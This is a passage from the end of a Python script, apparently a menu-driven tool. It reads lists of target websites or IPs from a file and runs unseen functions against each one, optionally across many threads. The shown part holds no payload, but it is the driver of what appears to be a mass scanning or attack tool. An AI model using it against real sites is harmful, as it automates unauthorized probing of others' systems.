    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw, liss)
  except Exception as e:
    pass


def nowayngntd2():

  Targetssa = input("\033[1;37;40mInput Your List : ") #for date
  ip_list = open(Targetssa, 'r').read().split('\
')
  for sites in ip_list:
    if 'http' not in sites:
      site = 'http://'+sites

      prepare2(site)
    else:
      prepare2(sites)

def makethread2(jumlah):
  try:
    nam = input("\033[1;37;40mInput Your List : ") #for date
    th = int(jumlah)
    time.sleep(3)
    liss = [ i.strip() for i in open(nam, 'r').readlines() ]
    zm = Pool(th)
    zm.map(jembotngw2, liss)
  except Exception as e:
    pass


def cinxx():
  try:
    menucit()
    Targetssad = input("\033[1;37;40mChoice : ") #for date
    if Targetssad == "1":

      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread(jumlahkn)
      else:
        nowayngntd()
    elif Targetssad == "3":
      checkset()
    else:
      Targetssas = input("\033[1;37;40mWith thread or no [y/n] : ") #for date
      if Targetssas == "y":
        jumlahkn = input("\033[1;37;40mThread : ") #for date
        makethread2(jumlahkn)
      else:
        nowayngntd2()
  except KeyboardInterrupt as e:
    print("Exit Program")
    sys.exit()

cinxx()
